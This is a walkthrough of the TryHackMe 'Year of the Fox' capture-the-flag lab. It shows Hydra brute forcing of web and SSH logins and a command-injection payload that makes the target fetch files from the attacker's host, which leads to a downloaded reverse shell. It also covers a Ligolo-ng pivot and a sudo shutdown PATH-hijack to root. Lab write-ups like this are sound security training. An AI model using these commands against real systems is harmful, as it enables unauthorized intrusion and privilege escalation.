![image](https://github.com/user-attachments/assets/209ac60d-2197-4bc1-a463-8e55a8a018c8)

https://tryhackme.com/r/room/yotf

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration

### Port scan:

I began my enumeration with a port and service scan using rustscan. This revealed three open ports on the target host:

```
rustscan -a 10.10.115.100 -- -A -T4 -vv -oN yotf_nmap
```

![image](https://github.com/user-attachments/assets/971d52a8-5e3b-445d-9d8a-4fea58c18f66)

```Rust
PORT    STATE SERVICE     REASON         VERSION
80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Sony X75CH-series Android TV (Android 5.0) (93%), Linux 2.6.32 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=7/25%OT=80%CT=%CU=40101%PV=Y%DS=4%DC=T%G=N%TM=66A1F59E%P=x86_64-pc-linux-gnu)
SEQ(SP=F9%GCD=1%ISR=100%TI=Z%CI=Z%TS=A)
SEQ(SP=FC%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 23.991 days (since Mon Jul  1 03:03:04 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2024-07-25T07:49:58+01:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50127/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59874/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 7458/udp): CLEAN (Failed to receive data)
|   Check 4 (port 41670/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-07-25T06:49:58
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   285.38 ms 10.6.0.1
2   ... 3
4   318.91 ms 10.10.115.100
```

### Web enumeration:

From the port scan, I observed that an HTTP server is running on port 80, so I attempted to browse it, but it requires authentication:

![image](https://github.com/user-attachments/assets/bcf9bf47-c3ad-42ff-ba17-72f95553626a)

I tried some basic default credentials, but they didn't work. 😕

Next, I performed a directory search using `dirsearch`, but it also yielded no results:

```
dirsearch -u http://10.10.115.100 -x 404,403 --crawl
```
![image](https://github.com/user-attachments/assets/9d4d2bcd-d2d6-4908-9d3c-05bf44343ba2)

### SMB Enumeration:

Next, I proceeded with SMB enumeration since the SAMBA share is available on the device. I used `smbclient-ng` to enumerate the shares. I successfully authenticated without any credentials and discovered a directory named **yotf**:

![image](https://github.com/user-attachments/assets/e242a4c9-355f-4109-814e-7fbc04b3ef8e)

However, when I tried to access that directory, I wasn't allowed. 😕

I then used enum4linux to enumerate the target host more thoroughly and found two users:

```
enum4linux 10.10.115.100
```

- fox
- rascal

![image](https://github.com/user-attachments/assets/22421c6c-6ec1-44f2-9a25-5fe51d3a63fc)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access

### Brute force:

Now that I had two valid usernames from my enumeration, and since the port scan results hinted at the need to guess the user password, I decided to brute force the web application login.

![image](https://github.com/user-attachments/assets/15333417-28d5-446f-8d64-84c4fa31b8cb)

I used Hydra for the password brute force. Before that, I checked in Burp Suite to determine which method was being used for authentication and observed that it was processed via the GET method:

![image](https://github.com/user-attachments/assets/32c940ad-87e8-400a-86ce-bd456aa19a6e)

```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.115.100 http-get
```

In less than four minutes, I obtained valid credentials for the user `rascal`:

![image](https://github.com/user-attachments/assets/c549c5a6-171a-4efc-afa1-c6751db3236b)

### Web flag:

Once I successfully logged in, I observed a search engine on the webpage, along with a few text files as search history:

![image](https://github.com/user-attachments/assets/9e7b7821-b8d5-47c8-b125-79e104b2f504)

I noticed that the search engine was blocking multiple characters. So, I decided to use a list of command injection payloads to check if any command could evade the filter. This command actually worked, and I received a connection on my HTTP server:

```
"`curl http://my_ip/text`"
```

![image](https://github.com/user-attachments/assets/7d75a68a-d2cf-402e-87fc-88ac15c24fa5)

![image](https://github.com/user-attachments/assets/12c9f318-7b8c-4cca-aa05-fddb59c8f704)

Leveraging this scenario, I created a bash reverse shell script and hosted it on my Kali host. I then made a `curl` request from the target host to download the bash script:

![image](https://github.com/user-attachments/assets/db6b03a1-06f2-425b-8a5a-343b42c037ad)

Next, I added execute permissions to that script:

![image](https://github.com/user-attachments/assets/c9108eae-8e6c-484f-a9bb-c429c9570776)

Finally, I executed it via bash to get the reverse shell:

![image](https://github.com/user-attachments/assets/e49a33b5-880e-4dd2-9f00-2853b6155200)

After execution, I quickly got the reverse shell back to my Kali host as the user www-data: 🙂

![image](https://github.com/user-attachments/assets/4a442b7c-0543-47a2-923d-f59b8db32356)

After checking a few directories, I found the web flag as well.

![image](https://github.com/user-attachments/assets/60c1a7d2-bdeb-4270-9da4-b12d468acf4f)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege escalation:

### Port forward:

As I continued my exploration, I noticed files that were visible in the search bar. However, upon examining them, I did not find anything useful:

![image](https://github.com/user-attachments/assets/9f273d55-ae3e-404f-9583-458dfa31275f)

I performed some manual enumeration and ran `linpeas`, but nothing significant showed up. However, when I checked the internally running ports, I noticed that port 22 was running locally:

![image](https://github.com/user-attachments/assets/b0cd42a8-cf0f-432c-8500-a28ec2b33a12)

To access the internal port, I used port forwarding with [Ligolo-ng](https://github.com/Nicocha30/ligolo-ng):

From my Kali host, I ran the following commands to start a Ligolo interface:

```bash
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

./proxy -selfcert  # Start Ligolo proxy without a valid certificate

./agent -connect myIP:11601 -ignore-cert  # From the target host

Start # From our own Ligolo-ng terminal

sudo ip route add 240.0.0.1/32 dev ligolo # Forward all the internal traffic to IP 240.0.0.1
```

![image](https://github.com/user-attachments/assets/d280981c-0d30-4005-a068-0db592cf0498)

### SSH:

After forwarding the port, I used Hydra to brute-force SSH login on port 22 for the second user, `fox`. After a few minutes, I successfully cracked the password:

![image](https://github.com/user-attachments/assets/38d812a6-bdc5-4d79-96de-ef65c3aa4297)

With this password, I was finally able to log in via SSH and obtain the root flag. 🙂

![image](https://github.com/user-attachments/assets/0e2a0a2e-83d6-44a6-bd3d-7c70f908e8c6)

## Root:

I began looking for privilege escalation vectors manually and checked my sudo privileges. I observed that I can run the `shutdown` command with root privileges:

```
sudo /usr/bin/shutdown
```

![image](https://github.com/user-attachments/assets/76feb5cb-16f1-4662-9ddd-7b452c359421)

I found an exploit method on the [exploit-notes website](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/):

```bash
echo /bin/bash > /tmp/poweroff  # Create a poweroff file that executes bash

chmod +x /tmp/poweroff  # Change the file permissions

export PATH=/tmp:$PATH  # Export the path to the temp folder

sudo /usr/sbin/shutdown  # Execute the shutdown command as sudo
```

After performing the above steps, I finally got a shell as the root user. 🙂

![image](https://github.com/user-attachments/assets/7e4f23d8-29ec-4a51-a94a-c2512906b5cc)

However, when I started looking for the flag in the root directory, I was unable to find it and encountered this message:

![image](https://github.com/user-attachments/assets/00cea85d-6b97-434d-9d1a-fb0eeb2b540e)

I remembered that I hadn't checked the `rascal` folder yet, and there might be a possibility that it contains the final flag.

And I was right. Checking the `rascal` home directory finally revealed the last flag. (pwn3d! 🎉)

![image](https://github.com/user-attachments/assets/9cf31817-6f7f-47c2-8765-7437594766d7)
